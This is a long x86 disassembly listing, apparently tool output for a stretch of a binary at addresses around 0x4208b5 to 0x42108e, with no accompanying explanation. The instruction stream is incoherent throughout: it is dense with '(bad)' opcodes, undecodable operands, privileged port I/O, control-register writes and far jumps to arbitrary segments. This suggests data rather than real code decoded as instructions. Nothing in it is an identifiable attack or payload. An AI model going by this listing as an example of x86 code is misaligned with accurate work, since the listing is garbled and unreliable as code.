  4208b5:	add    eax,DWORD PTR [ecx-0x1818af24]
  4208bb:	adc    al,0xf3
  4208bd:	call   0xb4f19de8
  4208c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208c3:	dec    edx
  4208c4:	je     0x4208f2
  4208c6:	loopne 0x42086d
  4208c8:	stc    
  4208c9:	into   
  4208ca:	rol    DWORD PTR [edi],cl
  4208cc:	add    BYTE PTR [edi-0x19a41633],ah
  4208d2:	push   esp
  4208d3:	cs aad 0xf5
  4208d6:	cmp    BYTE PTR [ebx],bh
  4208d8:	and    dl,al
  4208da:	je     0x420876
  4208dc:	xchg   ecx,eax
  4208dd:	or     esp,DWORD PTR [eax+esi*1-0x7bce0d4f]
  4208e4:	xchg   edi,eax
  4208e5:	ins    BYTE PTR es:[edi],dx
  4208e6:	dec    edx
  4208e7:	jecxz  0x420904
  4208e9:	push   ss
  4208ea:	popa   
  4208eb:	mov    esi,0xd6b86caa
  4208f0:	mov    al,0x2e
  4208f2:	call   0xf133365b
  4208f7:	fild   WORD PTR cs:0x77cb70cc
  4208fe:	fnstsw WORD PTR [esi+0x56]
  420901:	push   ecx
  420902:	dec    esi
  420903:	cmc    
  420904:	and    DWORD PTR [ebp-0x3],ebp
  420907:	xchg   edi,eax
  420908:	jb     0x4208ae
  42090a:	(bad)  
  42090b:	psadbw mm3,QWORD PTR [ecx]
  42090e:	mov    dh,0xd2
  420910:	push   0x5d619c20
  420915:	or     ecx,DWORD PTR [edx+0x568f190]
  42091b:	shl    BYTE PTR [edi+0x40dfb926],cl
  420921:	sbb    DWORD PTR ds:0xd579f5e5,esi
  420927:	ret    
  420928:	rol    BYTE PTR [edx],cl
  42092a:	sub    al,0x34
  42092c:	mov    edx,0x694551d4
  420931:	and    ch,BYTE PTR [edi]
  420933:	cmp    dh,ch
  420935:	mov    eax,0xfaef3777
  42093a:	je     0x4208c4
  42093c:	frstor [edx]
  42093e:	je     0x42093b
  420940:	test   al,0x25
  420942:	mov    ecx,0x50af6ef0
  420947:	(bad)  
  420948:	sti    
  420949:	ss out 0xb5,al
  42094c:	cld    
  42094d:	scas   al,BYTE PTR es:[edi]
  42094e:	cs adc al,0xbb
  420951:	fs inc esp
  420953:	out    dx,al
  420954:	or     eax,0xc1f6ed75
  420959:	jnp    0x420954
  42095b:	sbb    DWORD PTR [edi],esp
  42095d:	sti    
  42095e:	sub    DWORD PTR fs:[ebx-0x18],0x4e1de9b7
  420966:	xor    DWORD PTR [ebp-0x4e329dd7],0x1309912c
  420970:	sbb    DWORD PTR [ebx],esi
  420972:	div    DWORD PTR [esi+eiz*1+0x76246d10]
  420979:	adc    DWORD PTR [eax+ebx*4+0xb],edi
  42097d:	add    DWORD PTR [esp+ebp*4-0x5cbdf09],ebp
  420984:	in     eax,0xa2
  420986:	aad    0x51
  420988:	retf   
  420989:	jae    0x42094f
  42098b:	mov    al,0x8c
  42098d:	(bad)  
  42098e:	in     al,0x1d
  420990:	jg     0x4209a3
  420992:	cs retf 0x7b07
  420996:	cli    
  420997:	int3   
  420998:	dec    ecx
  420999:	sub    eax,0xa789c9b9
  42099e:	stos   BYTE PTR es:[edi],al
  42099f:	in     al,dx
  4209a0:	popf   
  4209a1:	jb     0x4209b9
  4209a3:	ret    0xfc90
  4209a6:	out    dx,eax
  4209a7:	test   eax,0x37bba93e
  4209ac:	cmc    
  4209ad:	jns    0x4209d5
  4209af:	jo     0x420a1f
  4209b1:	inc    ah
  4209b3:	add    ch,BYTE PTR [eax]
  4209b5:	clc    
  4209b6:	sub    dl,dh
  4209b8:	cmp    BYTE PTR [esi],ah
  4209ba:	sbb    eax,0x2db73d9d
  4209bf:	adc    edx,esi
  4209c1:	xchg   esp,eax
  4209c2:	enter  0xfbb2,0x93
  4209c6:	mov    al,0x6a
  4209c8:	fmulp  st(5),st
  4209ca:	mov    ebp,0x3340df6b
  4209cf:	cmp    al,0x32
  4209d1:	outs   dx,DWORD PTR ds:[esi]
  4209d2:	pop    esp
  4209d3:	repnz push 0x8b158e83
  4209d9:	add    DWORD PTR [ebp-0xd8258b9],edi
  4209df:	(bad)  [edi+0x6d]
  4209e2:	clc    
  4209e3:	lods   eax,DWORD PTR ds:[esi]
  4209e4:	retf   
  4209e5:	cmp    bh,bl
  4209e7:	pusha  
  4209e8:	fdiv   QWORD PTR ds:0x83ab8f5d
  4209ee:	mov    bh,0xc4
  4209f0:	push   esi
  4209f1:	push   ebp
  4209f2:	xchg   edi,eax
  4209f3:	dec    ebx
  4209f4:	xchg   esp,eax
  4209f5:	sub    DWORD PTR [eax-0x79],0x6b9da7b6
  4209fc:	sbb    BYTE PTR [ebx],ch
  4209fe:	xlat   BYTE PTR ds:[ebx]
  4209ff:	sar    ch,1
  420a01:	pushf  
  420a02:	cld    
  420a03:	bound  ebp,QWORD PTR [ebx]
  420a05:	pop    ds
  420a06:	pop    ecx
  420a07:	fwait
  420a08:	daa    
  420a09:	adc    DWORD PTR [edx+edi*4],esp
  420a0c:	pusha  
  420a0d:	mov    esp,esi
  420a0f:	(bad)  
  420a10:	stc    
  420a11:	push   esi
  420a12:	retf   
  420a13:	stos   DWORD PTR es:[edi],eax
  420a14:	cmp    DWORD PTR [ebp+ebp*2-0x28],ebp
  420a18:	adc    DWORD PTR [esi-0x1965e565],0x1d
  420a1f:	mov    edx,0xf1d697f
  420a24:	ss push edi
  420a26:	inc    edx
  420a27:	push   0xb5371dc8
  420a2c:	add    bl,BYTE PTR ds:0xafd92d6b
  420a32:	adc    DWORD PTR [ebp-0x31],ebp
  420a35:	dec    ebx
  420a36:	jmp    0x4209d4
  420a38:	jae    0x4209f7
  420a3a:	mov    bh,al
  420a3c:	mov    esp,DWORD PTR [eax]
  420a3e:	mov    bl,0x89
  420a40:	xchg   ebx,eax
  420a41:	into   
  420a42:	in     eax,dx
  420a43:	js     0x420a58
  420a45:	mov    esi,0xc292ec39
  420a4a:	ss addr16 jo 0x420a66
  420a4e:	add    eax,0xeda93ae0
  420a53:	jl     0x420a72
  420a55:	jnp    0x420a09
  420a57:	pop    ecx
  420a58:	inc    edi
  420a59:	jb     0x420a50
  420a5b:	adc    BYTE PTR [esi+0x78268582],0x82
  420a62:	xor    DWORD PTR [ecx+0x4d1025aa],0xfffffffb
  420a69:	movd   mm0,DWORD PTR [eax+0x4a]
  420a6d:	inc    ecx
  420a6e:	xor    BYTE PTR [ebp+0x69291d20],dh
  420a74:	jmp    0x6e7e:0x7049de16
  420a7b:	jl     0x420a48
  420a7d:	test   al,0x44
  420a7f:	fwait
  420a80:	aad    0x4
  420a82:	and    bl,al
  420a84:	bound  ecx,QWORD PTR [ebp-0x7f]
  420a87:	out    0xcb,al
  420a89:	shl    BYTE PTR ds:0x4d7954df,1
  420a8f:	and    edx,eax
  420a91:	stos   BYTE PTR es:[edi],al
  420a92:	inc    ebp
  420a93:	sub    BYTE PTR [ecx+0x2a],dl
  420a96:	or     eax,0xbc91d72b
  420a9b:	cmp    ecx,DWORD PTR [eax+0x816a629]
  420aa1:	mov    DWORD PTR [edx],esp
  420aa3:	inc    ecx
  420aa4:	cs mov bl,0x9c
  420aa7:	retf   
  420aa8:	les    ebp,FWORD PTR [ebp-0x22645c1a]
  420aae:	jo     0x420a9c
  420ab0:	addr16 mov ecx,0x28e3eced
  420ab6:	std    
  420ab7:	pop    edx
  420ab8:	cdq    
  420ab9:	outs   dx,DWORD PTR ds:[esi]
  420aba:	mov    ch,0x0
  420abc:	add    esp,ecx
  420abe:	cmc    
  420abf:	xchg   DWORD PTR [esi],esp
  420ac1:	loope  0x420b38
  420ac3:	inc    esp
  420ac4:	mov    ds:0x53b660d7,al
  420ac9:	xchg   ebp,eax
  420aca:	mov    edx,0x8369429d
  420acf:	mov    ebp,esp
  420ad1:	inc    ebp
  420ad2:	pop    ebp
  420ad3:	sbb    dl,BYTE PTR [esi-0xf]
  420ad6:	imul   ebp,ebp,0xffffffce
  420ad9:	add    esi,edi
  420adb:	jmp    DWORD PTR [edx+0x12]
  420ade:	xchg   ah,bl
  420ae0:	in     eax,dx
  420ae1:	scas   eax,DWORD PTR es:[di]
  420ae3:	retf   
  420ae4:	into   
  420ae5:	fs stos BYTE PTR es:[edi],al
  420ae7:	xchg   DWORD PTR [ebx+0x612d9300],eax
  420aed:	add    BYTE PTR [edx],cl
  420aef:	(bad)  
  420af0:	and    cl,bl
  420af2:	rol    BYTE PTR [eax-0x3a509360],cl
  420af8:	ror    DWORD PTR [ebx],cl
  420afa:	adc    ch,BYTE PTR [ecx]
  420afc:	cmp    BYTE PTR [esi+0x3b39574a],ch
  420b02:	fnsave [ecx-0x3e58fa92]
  420b08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b09:	sub    DWORD PTR [eax+0x7f],ebp
  420b0c:	mov    bl,0x10
  420b0e:	mov    ds:0xd3a8aecf,eax
  420b13:	sub    edi,DWORD PTR [esi]
  420b15:	dec    esi
  420b16:	mov    dl,0x78
  420b18:	jns    0x420b0c
  420b1a:	xlat   BYTE PTR ds:[ebx]
  420b1b:	pop    ecx
  420b1c:	dec    ebp
  420b1d:	test   al,0x9d
  420b1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b20:	lods   eax,DWORD PTR ds:[esi]
  420b21:	call   0x84d8c8d8
  420b26:	cld    
  420b27:	cmp    eax,0x702fb5e5
  420b2c:	cmp    al,0x6b
  420b2e:	and    ebp,DWORD PTR [ebx]
  420b30:	mov    ?,WORD PTR [edx]
  420b32:	ret    0xc79d
  420b35:	outs   dx,BYTE PTR ds:[esi]
  420b36:	sahf   
  420b37:	ss out dx,eax
  420b39:	cmp    BYTE PTR ss:[edx+0x4d],cl
  420b3d:	in     eax,dx
  420b3e:	stc    
  420b3f:	jp     0x420b87
  420b41:	sub    BYTE PTR [esi],0xf9
  420b44:	fild   QWORD PTR [eax]
  420b46:	addr16 inc ebx
  420b48:	gs pop ebx
  420b4a:	dec    edi
  420b4b:	push   edi
  420b4c:	(bad)  
  420b4e:	jb     0x420b5d
  420b50:	pop    esi
  420b51:	loop   0x420b62
  420b53:	addr16 jl 0x420bd5
  420b56:	cli    
  420b57:	push   ss
  420b58:	mov    dl,0xd3
  420b5a:	mov    ebp,0x6b9320d1
  420b5f:	call   0xae9f6beb
  420b64:	and    eax,0x7a9bf081
  420b69:	idiv   BYTE PTR [ebp+0x7473eade]
  420b6f:	add    DWORD PTR [ebx+0x78b97851],eax
  420b75:	stc    
  420b76:	or     al,0x2e
  420b78:	inc    esp
  420b79:	test   eax,0xd5059324
  420b7e:	pop    ds
  420b7f:	xor    dl,bl
  420b81:	pop    esp
  420b82:	lock pop ebx
  420b84:	retf   0x5a93
  420b87:	mov    bh,BYTE PTR [ebx]
  420b89:	lahf   
  420b8a:	inc    ebx
  420b8b:	(bad)  
  420b8c:	fxch   st(5)
  420b8e:	in     eax,dx
  420b8f:	xor    BYTE PTR [ecx-0x29],ah
  420b92:	pop    eax
  420b93:	ret    0x54b7
  420b96:	adc    al,0xb2
  420b98:	imul   esp,DWORD PTR [eax+eax*1],0x3
  420b9c:	pushf  
  420b9d:	cs rol ebx,0x40
  420ba1:	aas    
  420ba2:	shl    DWORD PTR [esi+eax*2-0x39],0xc6
  420ba7:	mov    gs,WORD PTR [ebp-0x7dfa8d0c]
  420bad:	mov    eax,0xf6fcff5b
  420bb2:	clc    
  420bb3:	push   cs
  420bb4:	jmp    0xb24d:0xaaf78b0a
  420bbb:	mov    al,0x41
  420bbd:	repnz aas 
  420bbf:	jo     0x420c35
  420bc1:	pop    ds
  420bc2:	mov    ebp,0x53ff2f94
  420bc7:	jns    0x420b99
  420bc9:	inc    ebx
  420bca:	icebp  
  420bcb:	push   edi
  420bcc:	imul   esi,DWORD PTR [eax+0x62b28577],0xf4294fef
  420bd6:	inc    BYTE PTR [edi+esi*1]
  420bd9:	sub    BYTE PTR [edi],cl
  420bdb:	mov    eax,ss:0xd0356312
  420be1:	xchg   dl,cl
  420be3:	mov    cr5,esp
  420be6:	pop    ebp
  420be7:	shr    BYTE PTR [ebx+0x2a6203e3],1
  420bed:	out    0xa8,eax
  420bef:	jo     0x420c30
  420bf1:	icebp  
  420bf2:	in     al,dx
  420bf3:	cmc    
  420bf4:	dec    esp
  420bf5:	xor    DWORD PTR [eax],esp
  420bf7:	fstp   QWORD PTR [ebx+eax*4-0x63212cf8]
  420bfe:	mov    ch,al
  420c00:	push   edx
  420c01:	bndldx (bad),[esi+0x49b35649]
  420c08:	xor    edx,eax
  420c0a:	cmp    esp,ecx
  420c0c:	or     DWORD PTR [eax-0x30],0x7
  420c10:	cmp    esi,DWORD PTR [edx]
  420c12:	pop    ebx
  420c13:	popf   
  420c14:	cmp    eax,0x22f4b9ef
  420c19:	loope  0x420bf8
  420c1b:	int3   
  420c1c:	mov    al,dl
  420c1e:	xor    DWORD PTR [edi],edi
  420c20:	and    dh,bl
  420c22:	retf   0xfa9
  420c25:	int    0x3f
  420c27:	add    al,0x36
  420c29:	in     eax,dx
  420c2a:	jne    0x420bfe
  420c2c:	out    dx,al
  420c2d:	pusha  
  420c2e:	sub    BYTE PTR [ecx-0x52],al
  420c31:	jg     0x420c71
  420c33:	mov    ?,WORD PTR [ecx+eax*4]
  420c36:	jae    0x420c4e
  420c38:	sbb    DWORD PTR [edx-0x27cd02cc],ebx
  420c3e:	mov    WORD PTR [eax+edx*8],fs
  420c41:	imul   DWORD PTR [eax]
  420c43:	dec    ebp
  420c44:	jbe    0x420c9b
  420c46:	xchg   edi,eax
  420c47:	jns    0x420cb6
  420c49:	iret   
  420c4a:	mov    ebp,0xa619826e
  420c4f:	retf   
  420c50:	dec    ebp
  420c51:	push   0x69
  420c53:	fsubp  st(4),st
  420c55:	stc    
  420c56:	cmp    ah,BYTE PTR [edi+edx*2-0x63]
  420c5a:	mov    ds:0x11cb561d,al
  420c5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c60:	sti    
  420c61:	test   DWORD PTR [eax-0x17],ebp
  420c64:	bound  ebx,QWORD PTR [edi+esi*1+0x56503ba8]
  420c6b:	inc    esi
  420c6c:	mov    dl,0x1d
  420c6e:	add    BYTE PTR [eax],al
  420c70:	add    BYTE PTR [eax],al
  420c72:	add    DWORD PTR [ebp-0x28],edi
  420c75:	mov    ebp,0xfd65bdfc
  420c7a:	or     cl,BYTE PTR [ecx-0x100a47a9]
  420c80:	stos   BYTE PTR es:[edi],al
  420c81:	or     eax,0x186c9
  420c86:	hlt    
  420c87:	add    al,0x0
  420c89:	add    BYTE PTR [ecx],ah
  420c8b:	push   ebp
  420c8c:	inc    eax
  420c8d:	out    0xf0,eax
  420c8f:	inc    esi
  420c90:	imul   esi,DWORD PTR [ecx],0x18
  420c93:	jno    0x420c27
  420c95:	mov    esi,0xee3a81be
  420c9a:	jmp    0x291:0xecbbd8ba
  420ca1:	sahf   
  420ca2:	frstor [edi+0x56]
  420ca5:	popf   
  420ca6:	clc    
  420ca7:	fst    QWORD PTR [ecx+0x6074f51]
  420cad:	into   
  420cae:	test   eax,0x91d7a681
  420cb3:	ds ins BYTE PTR es:[edi],dx
  420cb5:	into   
  420cb6:	std    
  420cb7:	xchg   edx,eax
  420cb8:	jp     0x420d33
  420cba:	pusha  
  420cbb:	push   ebp
  420cbc:	(bad)  
  420cbd:	test   BYTE PTR [eax+ebp*8],0xa9
  420cc1:	(bad)  
  420cc2:	push   ecx
  420cc3:	push   edi
  420cc4:	mov    ah,0x15
  420cc6:	fmul   QWORD PTR [ecx+0x7]
  420cc9:	mov    WORD PTR [ecx],ds
  420ccb:	or     eax,0xea7222f2
  420cd0:	add    dl,BYTE PTR [esi-0x5]
  420cd3:	scas   al,BYTE PTR es:[edi]
  420cd4:	repnz lock pop ds
  420cd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420cd8:	and    BYTE PTR [ebx+0xc],0xd7
  420cdc:	push   esi
  420cdd:	sub    eax,0x81d8aff2
  420ce2:	dec    esi
  420ce3:	fstp   QWORD PTR [edi]
  420ce5:	sahf   
  420ce6:	sbb    eax,0xcf99d016
  420ceb:	retf   
  420cec:	repz not BYTE PTR ds:0x70d3fdcb
  420cf3:	sub    BYTE PTR [ecx+0x624d266c],0x11
  420cfa:	imul   edx,DWORD PTR [esi+edx*1-0x236a3d79],0x780f11ab
  420d05:	mov    ecx,0xbfe9b830
  420d0a:	mov    cl,0x6b
  420d0c:	enter  0x7952,0xfe
  420d10:	xor    BYTE PTR [eax],ah
  420d12:	rol    eax,1
  420d14:	or     dh,BYTE PTR [eax]
  420d16:	std    
  420d17:	and    al,0x73
  420d19:	fsubp  st(1),st
  420d1b:	out    dx,al
  420d1c:	cmp    dl,BYTE PTR ds:0x6913ff3c
  420d22:	js     0x420d2c
  420d24:	icebp  
  420d25:	pop    ebp
  420d26:	mov    al,0x11
  420d28:	push   eax
  420d29:	ins    DWORD PTR es:[edi],dx
  420d2a:	ret    
  420d2b:	inc    ebp
  420d2c:	hlt    
  420d2d:	and    al,0xd1
  420d2f:	in     eax,dx
  420d30:	pushf  
  420d31:	pop    ebp
  420d32:	mov    ebx,0xd8f6cea2
  420d37:	clc    
  420d38:	adc    eax,0x80d8f9ba
  420d3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d3e:	cmp    eax,0x19113d04
  420d43:	inc    ecx
  420d44:	stc    
  420d45:	or     eax,0x42c2b51c
  420d4a:	mov    gs,WORD PTR [ecx+esi*4+0xf]
  420d4e:	shl    DWORD PTR [ebp-0x66023b15],0x69
  420d55:	lods   al,BYTE PTR ds:[esi]
  420d56:	pop    esp
  420d57:	rcr    BYTE PTR [ebp+0x7ab75ed2],0x38
  420d5e:	pusha  
  420d5f:	ins    BYTE PTR es:[edi],dx
  420d60:	jne    0x420daf
  420d62:	fmul   DWORD PTR [esi-0x10f2c4de]
  420d68:	fwait
  420d69:	sub    al,dh
  420d6b:	push   eax
  420d6c:	sbb    eax,0x70df109f
  420d71:	out    dx,al
  420d72:	aad    0x62
  420d74:	mov    ss,WORD PTR ds:0xf5fbed66
  420d7a:	mov    al,ds:0xdecf6b1d
  420d7f:	test   eax,0xee0ae322
  420d84:	cmp    BYTE PTR [edi],0x96
  420d87:	daa    
  420d88:	sbb    edx,DWORD PTR [eax+edx*2-0x3359f707]
  420d8f:	call   0xfb260d4
  420d94:	ret    
  420d95:	jb     0x420d3e
  420d97:	mov    ds:0xafe8acec,al
  420d9c:	daa    
  420d9d:	(bad)  
  420d9e:	retf   
  420d9f:	lahf   
  420da0:	mov    ebx,0xd00fc582
  420da5:	cli    
  420da6:	jmp    0x420de2
  420da8:	mov    ch,0x96
  420daa:	sub    BYTE PTR [ecx+0x4eb86d8a],al
  420db0:	jae    0x420d57
  420db2:	pop    eax
  420db3:	jecxz  0x420d3e
  420db5:	lods   eax,DWORD PTR ds:[esi]
  420db6:	push   ds
  420db7:	in     al,0x82
  420db9:	fisubr DWORD PTR [edi+0x18]
  420dbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420dbd:	cld    
  420dbe:	mov    bh,0xaa
  420dc0:	push   ss
  420dc1:	mov    ch,BYTE PTR [esi-0x55]
  420dc4:	pop    esi
  420dc5:	mov    DWORD PTR [esi],ecx
  420dc7:	int    0xa4
  420dc9:	test   eax,0xfddc9ef5
  420dce:	xchg   ch,ah
  420dd0:	add    ebp,eax
  420dd2:	xchg   edi,eax
  420dd3:	sbb    DWORD PTR [ebp+0x3d1dc539],eax
  420dd9:	mov    eax,0xa8d5cd22
  420dde:	retf   
  420ddf:	daa    
  420de0:	inc    ebp
  420de1:	fsub   st,st(6)
  420de3:	push   ecx
  420de4:	jecxz  0x420e63
  420de6:	mov    gs,WORD PTR [esi+0x15]
  420de9:	sbb    eax,esp
  420deb:	enter  0xf32d,0xb5
  420def:	or     ch,0x59
  420df2:	dec    ebp
  420df3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420df4:	push   ebp
  420df5:	icebp  
  420df6:	pop    esp
  420df7:	lods   al,BYTE PTR cs:[esi]
  420df9:	or     esp,DWORD PTR [edi+edx*2]
  420dfc:	(bad)  
  420dfd:	and    al,0x25
  420dff:	pop    esi
  420e00:	jg     0x420df9
  420e02:	cmc    
  420e03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e04:	mov    al,ds:0xbbaa3708
  420e09:	and    dl,dh
  420e0b:	pop    edi
  420e0c:	test   al,0xe5
  420e0e:	pushf  
  420e0f:	adc    edx,ebx
  420e11:	mul    BYTE PTR [eax]
  420e13:	push   ebp
  420e14:	sbb    bl,BYTE PTR [eax+0x1be14f59]
  420e1a:	pushf  
  420e1b:	jmp    0xa0576af6
  420e20:	popf   
  420e21:	mov    ebx,0x8cb3ca2f
  420e26:	cmp    cl,0xdc
  420e29:	sub    dl,al
  420e2b:	pop    edx
  420e2c:	mov    esp,?
  420e2e:	ja     0x420db6
  420e30:	pop    esi
  420e31:	mov    edx,0x1ab0ad14
  420e36:	mov    ch,0xc8
  420e38:	mov    ch,0xb5
  420e3a:	test   bh,al
  420e3c:	daa    
  420e3d:	cmp    eax,0xdf47f190
  420e42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e43:	bswap  ebp
  420e45:	inc    ebp
  420e46:	jecxz  0x420e0e
  420e48:	stos   BYTE PTR es:[edi],al
  420e49:	leave  
  420e4a:	and    esp,DWORD PTR [eax]
  420e4c:	sub    al,0xad
  420e4e:	into   
  420e4f:	xchg   BYTE PTR [ebx-0x7324943e],dh
  420e55:	inc    ecx
  420e56:	dec    ebp
  420e57:	mov    bh,0xf6
  420e59:	pop    ss
  420e5a:	popa   
  420e5b:	mov    eax,0xf0918a47
  420e60:	sub    ch,BYTE PTR ds:0x2d420b6
  420e66:	xor    DWORD PTR [ebx-0x61],0x47ab69e1
  420e6d:	sbb    al,0xfa
  420e6f:	mov    bl,BYTE PTR [eax-0x7040e929]
  420e75:	sub    BYTE PTR [edx+0x2b],cl
  420e78:	pusha  
  420e79:	inc    ebx
  420e7a:	cdq    
  420e7b:	test   cl,dl
  420e7d:	in     al,dx
  420e7e:	pushf  
  420e7f:	cmp    bh,BYTE PTR [ecx+0x493342b4]
  420e85:	xlat   BYTE PTR ds:[ebx]
  420e86:	cld    
  420e87:	push   edx
  420e88:	or     eax,0x1b6d5bc7
  420e8d:	rol    BYTE PTR [eax],0xbf
  420e90:	nop
  420e91:	xor    eax,0x2e7ec474
  420e96:	mov    ah,0xe6
  420e98:	loopne 0x420ed0
  420e9a:	sbb    DWORD PTR [esi-0x2e],0xb63f7ad4
  420ea1:	xchg   esi,eax
  420ea2:	lods   eax,DWORD PTR ds:[esi]
  420ea3:	int3   
  420ea4:	dec    ebx
  420ea5:	xchg   ebx,eax
  420ea6:	xchg   esp,edx
  420ea8:	push   0xffffff9b
  420eaa:	aam    0x5
  420eac:	jbe    0x420ee8
  420eae:	adc    DWORD PTR [esi+ebx*4],0xb7b6a13f
  420eb5:	jb     0x420e5b
  420eb7:	retf   0xd45c
  420eba:	ror    DWORD PTR [esi-0x30],0x8
  420ebe:	jae    0x420eff
  420ec0:	mov    bh,0x9f
  420ec2:	aam    0x37
  420ec4:	xchg   ecx,eax
  420ec5:	inc    ebx
  420ec6:	push   0xffffffa2
  420ec8:	jmp    0x888333dc
  420ecd:	es loope 0x420ef0
  420ed0:	or     al,0x7
  420ed2:	in     al,0xca
  420ed4:	sub    al,0xb0
  420ed6:	fs sbb eax,0x75abeaa2
  420edc:	cld    
  420edd:	inc    ebx
  420ede:	lahf   
  420edf:	js     0x420eb4
  420ee1:	es fs (bad) 
  420ee4:	fisubr DWORD PTR [edi+0x2c]
  420ee7:	sub    DWORD PTR [eax],esi
  420ee9:	jne    0x420f5f
  420eeb:	and    ecx,DWORD PTR [esp+edx*8-0x7f]
  420eef:	retf   
  420ef0:	test   BYTE PTR [edi],ah
  420ef2:	ficom  WORD PTR [ebx+0x6]
  420ef5:	sbb    ebx,ebx
  420ef7:	jb     0x420f78
  420ef9:	cmp    esp,DWORD PTR [edi+0x2a8dd885]
  420eff:	rcl    DWORD PTR [ecx-0x4328722f],cl
  420f05:	xchg   ecx,eax
  420f06:	xor    bl,BYTE PTR [edi+0x4e31bd5b]
  420f0c:	mov    ds:0xe8a23805,eax
  420f11:	jg     0x420f0b
  420f13:	(bad)  
  420f14:	fstp   TBYTE PTR [edx+0x61]
  420f17:	xchg   ah,cl
  420f19:	int    0xa9
  420f1b:	and    BYTE PTR [esi+0x4a3a8968],ch
  420f21:	mov    WORD PTR [edi+0x7c],gs
  420f24:	mov    WORD PTR [ebx+0x572421ee],?
  420f2a:	pop    ecx
  420f2b:	jge    0x420f36
  420f2d:	out    dx,eax
  420f2e:	lds    esi,FWORD PTR [edx+0x4e]
  420f31:	adc    ch,BYTE PTR [ebx-0x78249d6b]
  420f37:	lds    edx,FWORD PTR [edx]
  420f39:	inc    edx
  420f3a:	add    dl,BYTE PTR [edx]
  420f3c:	(bad)  
  420f3d:	mov    ah,0x9
  420f3f:	adc    BYTE PTR [edx-0x3e60b351],cl
  420f45:	das    
  420f46:	add    cl,al
  420f48:	push   esp
  420f49:	fst    QWORD PTR [ecx-0x13]
  420f4c:	mov    edi,0x5ff68e70
  420f51:	push   eax
  420f52:	shl    DWORD PTR [ebp+eiz*4-0x64],1
  420f56:	mov    dh,0xc6
  420f58:	test   ebx,ebx
  420f5a:	outs   dx,BYTE PTR ds:[esi]
  420f5b:	addps  xmm0,XMMWORD PTR [ebp-0x727843ab]
  420f62:	cmp    dl,BYTE PTR [eax]
  420f64:	jne    0x420fbd
  420f66:	fnstsw WORD PTR [ebx-0x3f5c8b63]
  420f6c:	xor    eax,0x4ed8c873
  420f71:	sub    al,0x81
  420f73:	jl     0x420f3b
  420f75:	mov    ebp,0x37f3a65d
  420f7a:	icebp  
  420f7b:	sbb    al,BYTE PTR [esi-0x1964d992]
  420f81:	adc    esi,0xbe7f6de3
  420f87:	pusha  
  420f88:	gs cmp al,0xb5
  420f8b:	retf   
  420f8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f8d:	xor    ebx,0xd69e70ac
  420f93:	or     eax,0xa68a7a32
  420f98:	dec    edx
  420f99:	sbb    edx,DWORD PTR [edx+0x3d]
  420f9c:	rcr    DWORD PTR [ecx],1
  420f9e:	adc    al,BYTE PTR [ebx+eax*4-0x5f9a3fae]
  420fa5:	xchg   ebp,ebp
  420fa7:	and    esi,DWORD PTR [eax-0x6f]
  420faa:	das    
  420fab:	nop
  420fac:	inc    ecx
  420fad:	jno    0x420f40
  420faf:	loopne 0x420f9d
  420fb1:	jmp    0xc1b8:0x3ed829ba
  420fb8:	adc    esi,edx
  420fba:	(bad)  
  420fbb:	fmul   DWORD PTR [ecx+0x72ff1d1f]
  420fc1:	jo     0x420ffc
  420fc3:	stos   DWORD PTR es:[edi],eax
  420fc4:	jo     0x420f5c
  420fc6:	xchg   edx,eax
  420fc7:	jbe    0x421002
  420fc9:	out    0x19,eax
  420fcb:	rcr    eax,cl
  420fcd:	jmp    0x56fe9765
  420fd2:	fsubrp st(4),st
  420fd4:	dec    ecx
  420fd5:	sbb    ebp,DWORD PTR [edx]
  420fd7:	or     DWORD PTR [edi+eiz*1+0x66],edi
  420fdb:	call   0x32394ea3
  420fe0:	lahf   
  420fe1:	mov    eax,ds:0x5ac8286b
  420fe6:	dec    ebx
  420fe7:	adc    BYTE PTR [ecx],dl
  420fe9:	jmp    0x6f89762
  420fee:	push   ss
  420fef:	sbb    eax,0x9d933a91
  420ff4:	push   0x61
  420ff6:	ficomp WORD PTR [eax+edx*4]
  420ff9:	sbb    ch,dh
  420ffb:	cmp    edx,ebp
  420ffd:	dec    edi
  420ffe:	cwde   
  420fff:	mov    ch,0xc1
  421001:	jno    0x420fe8
  421003:	or     eax,DWORD PTR [esi]
  421005:	sets   BYTE PTR [edi-0x7a22e0cc]
  42100c:	push   eax
  42100d:	imul   edi,DWORD PTR [eax+0x4f],0x59520a2f
  421014:	sbb    BYTE PTR [edi+edi*2],0xe4
  421018:	stos   DWORD PTR es:[edi],eax
  421019:	fcom   DWORD PTR [esi-0x760de12f]
  42101f:	pop    ebp
  421020:	mov    esp,0x7999f43f
  421025:	jp     0x42108d
  421027:	mov    eax,ds:0x18094953
  42102c:	aas    
  42102d:	dec    edi
  42102e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42102f:	ins    DWORD PTR es:[edi],dx
  421030:	and    eax,0x2d9d585e
  421035:	mov    cs,ebp
  421037:	push   ebx
  421038:	and    al,0xa8
  42103a:	ret    
  42103b:	xchg   BYTE PTR [ebx+0x28e3f33b],dh
  421041:	mov    ds:0xa4895c01,eax
  421046:	sbb    al,0x88
  421048:	cli    
  421049:	test   dl,bl
  42104b:	jge    0x421007
  42104d:	push   0xb41c091f
  421052:	add    al,0xb
  421054:	adc    eax,0x1efd96b5
  421059:	inc    ecx
  42105a:	sbb    eax,0xeea8d47b
  42105f:	pusha  
  421060:	in     eax,0x62
  421062:	outs   dx,BYTE PTR ds:[esi]
  421063:	pop    eax
  421064:	test   BYTE PTR [ebx+0x5d],cl
  421067:	fcomp  DWORD PTR [edx]
  421069:	mov    dl,0x18
  42106b:	push   edi
  42106c:	and    al,0x26
  42106e:	mov    ds:0xc5a465c1,eax
  421073:	in     al,dx
  421074:	jl     0x4210e6
  421076:	push   edi
  421077:	(bad)  
  421078:	test   eax,0x536260b1
  42107d:	xor    dl,ch
  42107f:	rcr    BYTE PTR [esi-0x254f4422],0xfb
  421086:	push   edx
  421087:	call   0xaf96161c
  42108c:	ret    
  42108d:	push   ss
  42108e:	leave  
